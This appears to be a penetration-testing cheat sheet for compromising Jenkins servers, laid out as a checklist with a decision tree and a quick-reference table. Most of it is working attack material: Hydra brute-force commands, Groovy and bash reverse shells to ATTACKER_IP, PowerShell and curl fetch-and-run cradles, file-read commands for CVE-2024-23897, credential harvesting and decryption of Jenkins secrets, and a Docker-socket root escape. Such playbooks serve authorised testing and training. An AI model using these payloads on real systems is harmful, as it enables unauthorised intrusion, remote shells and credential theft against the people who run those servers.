# Jenkins Methodology

## 1. Discovery

- [ ] Nmap service scan on common Jenkins ports
```bash
nmap -sV -p 8080,8443,50000 TARGET
```
- [ ] Check for unauthenticated access — browse directly to `http://TARGET:8080`
- [ ] Default port: **8080** (HTTP), **8443** (HTTPS), **50000** (Jenkins agent/JNLP)
- [ ] Login page endpoints: `/login`, `/securityRealm/`
- [ ] Version fingerprint: check bottom-right of login page or `/api/`
- [ ] Script Console: `/script` — **direct RCE if accessible**
- [ ] Management endpoints: `/manage`, `/configure`, `/pluginManager/`
- [ ] User enumeration: `/asynchPeople/` (list of users if exposed)
- [ ] API access: `/api/json?pretty=true` (unauthenticated info disclosure)

### Default / Common Credentials
| Username | Password |
|----------|----------|
| admin | admin |
| admin | password |
| admin | (blank) |
| jenkins | jenkins |

- [ ] Try default creds on `/login`
- [ ] Brute force with Hydra:
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET -s 8080 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"
```

---

## 2. Script Console RCE (/script)

> **Priority check.** If `/script` is accessible (no auth or after login), this is instant RCE. Always try this first.

- [ ] Navigate to `http://TARGET:8080/script`
- [ ] Start listener: `nc -nlvp PORT`

### Command Execution (Quick Test)
```groovy
def cmd = "id".execute()
println(cmd.text)
```

### Linux Reverse Shell
```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKER_IP/PORT;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### Linux Reverse Shell (Alternative — more reliable)
```groovy
String host="ATTACKER_IP"
int port=PORT
String cmd="/bin/bash"
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start()
Socket s=new Socket(host,port)
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream()
OutputStream po=p.getOutputStream(),so=s.getOutputStream()
while(!s.isClosed()){
  while(pi.available()>0)so.write(pi.read())
  while(pe.available()>0)so.write(pe.read())
  while(si.available()>0)po.write(si.read())
  so.flush();po.flush();Thread.sleep(50)
  try{p.exitValue();break}catch(Exception e){}
}
p.destroy();s.close()
```

### Windows Reverse Shell (ProcessBuilder + Socket)
```groovy
String host="ATTACKER_IP";int port=PORT;String cmd="cmd.exe";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break}catch(Exception e){}};p.destroy();s.close()
```

### Windows — PowerShell Download Cradle via Groovy
```groovy
r = Runtime.getRuntime()
p = r.exec("cmd.exe /c powershell -ep bypass -c \"IEX(New-Object Net.WebClient).downloadString('http://ATTACKER_IP/shell.ps1')\"")
p.waitFor()
```

### Write File to Disk via Script Console
```groovy
new File("/tmp/proof.txt").text = "owned"
```

### Read File via Script Console
```groovy
println(new File("/etc/passwd").text)
```

---

## 3. Freestyle Job RCE (No Script Console Access)

> If you have credentials but `/script` is locked down, create a job instead.

- [ ] New Item → Freestyle project → name it anything
- [ ] Scroll to Build section → Add build step
- [ ] Select **Execute shell** (Linux) or **Execute Windows batch command** (Windows)
- [ ] Start listener: `nc -nlvp PORT`

### Linux Build Step
```bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
```

### Windows Build Step
```batch
powershell -ep bypass -c "IEX(New-Object Net.WebClient).downloadString('http://ATTACKER_IP/shell.ps1')"
```

### Alternative — curl to download and execute
```bash
curl http://ATTACKER_IP/shell.sh | bash
```

- [ ] Save → Build Now → catch shell
- [ ] Check Console Output if shell does not connect (debugging)

### Pipeline Job (Jenkinsfile) Alternative
If only Pipeline jobs are allowed:
```groovy
pipeline {
    agent any
    stages {
        stage('shell') {
            steps {
                sh 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'
            }
        }
    }
}
```

---

## 4. Known CVEs

### CVE-2024-23897 — Arbitrary File Read (Critical)
- **Affects:** Jenkins <= 2.441, LTS <= 2.426.2
- Pre-auth or low-priv arbitrary file read via CLI argument parsing
- Uses `@` character expansion in CLI args to read server-side files
```bash
# Download jenkins-cli.jar from the target
wget http://TARGET:8080/jnlpJars/jenkins-cli.jar

# Read /etc/passwd (first few lines)
java -jar jenkins-cli.jar -s http://TARGET:8080/ help "@/etc/passwd"

# With connect-node (reads more lines)
java -jar jenkins-cli.jar -s http://TARGET:8080/ connect-node "@/etc/passwd"
```
- Escalation: read `credentials.xml`, `master.key`, `hudson.util.Secret` → decrypt creds → login → Script Console → RCE

### CVE-2018-1999002 — Arbitrary File Read
- Pre-auth in certain configurations
- Path traversal via Stapler web framework

### CVE-2019-1003000 — Sandbox Bypass → RCE
- Groovy sandbox escape via Pipeline
- Combined with CVE-2018-1999002 for pre-auth RCE chain

### CVE-2016-0792 — Deserialization RCE
- Pre-auth RCE via XStream deserialization
- Affects Jenkins < 1.650, LTS < 1.642.2

### Jenkins 2.150.2 — JOB+BUILD Permission Abuse
- Limited user with Job/Build permissions can still get RCE
- Create Freestyle job with build step (see Section 3)

---

## 5. Post-Exploitation

### Credential Harvesting
- [ ] Locate Jenkins home directory
  - Linux: `/var/lib/jenkins/`
  - Windows: `C:\Users\<user>\.jenkins\` or `C:\ProgramData\Jenkins\.jenkins\`
- [ ] Grab credential files:
```bash
cat /var/lib/jenkins/credentials.xml
cat /var/lib/jenkins/secrets/master.key
cat /var/lib/jenkins/secrets/hudson.util.Secret
```
- [ ] Decrypt credentials offline:
```bash
# Use jenkins-credentials-decryptor
# https://github.com/hoto/jenkins-credentials-decryptor
jenkins-credentials-decryptor -m master.key -s hudson.util.Secret -c credentials.xml
```
- [ ] Alternatively, decrypt via Script Console if you have access:
```groovy
println(hudson.util.Secret.decrypt("{AQAAABAAAAAwxxxxxxx}"))
```

### Other Loot Locations
- [ ] `config.xml` — user configs, permissions, job definitions
- [ ] `/var/lib/jenkins/users/*/config.xml` — per-user configs, password hashes
- [ ] Build history logs — may contain hardcoded secrets, tokens, passwords
- [ ] Environment variables in build configs — API keys, cloud creds
- [ ] SSH keys in `/var/lib/jenkins/.ssh/`
- [ ] Workspace directories may contain source code with embedded secrets

### Privilege Escalation from Jenkins
- [ ] Jenkins often runs as root or SYSTEM — check `whoami`
- [ ] If running as `jenkins` user, check sudo permissions: `sudo -l`
- [ ] Check for Docker socket access: `ls -la /var/run/docker.sock`
  - If accessible: `docker run -v /:/mnt --rm -it alpine chroot /mnt sh`

---

## 6. Decision Tree

```
Jenkins Found (8080)
│
├─ /script accessible without auth?
│  └─ YES → Groovy reverse shell → INSTANT RCE (Section 2)
│
├─ /login page → try default creds (admin:admin, etc.)
│  ├─ Login works → /script accessible?
│  │  ├─ YES → Groovy reverse shell → RCE (Section 2)
│  │  └─ NO → Can create jobs?
│  │     ├─ YES → Freestyle job → build step → RCE (Section 3)
│  │     └─ NO → Check version → CVE exploits (Section 4)
│  └─ Login fails → brute force / check CVEs
│
├─ Check version (login page footer, /api/)
│  ├─ <= 2.441 → CVE-2024-23897 file read → cred decrypt → login → RCE
│  ├─ Older versions → CVE-2019-1003000 sandbox bypass
│  └─ Very old → CVE-2016-0792 deserialization
│
└─ Post-exploit (after shell)
   ├─ credentials.xml + master.key + hudson.util.Secret → decrypt → pivot
   ├─ Build logs / workspace → secrets, API keys
   ├─ SSH keys → lateral movement
   └─ Check if running as root/SYSTEM → game over
```

---

## 7. Quick Reference Commands

| Task | Command |
|------|---------|
| Scan | `nmap -sV -p 8080,8443,50000 TARGET` |
| Listener | `nc -nlvp PORT` |
| Download CLI jar | `wget http://TARGET:8080/jnlpJars/jenkins-cli.jar` |
| API info | `curl -s http://TARGET:8080/api/json?pretty=true` |
| User list | `curl -s http://TARGET:8080/asynchPeople/api/json` |
| Version check | `curl -sI http://TARGET:8080 \| grep X-Jenkins` |
| Brute force | `hydra -l admin -P wordlist TARGET -s 8080 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid"` |
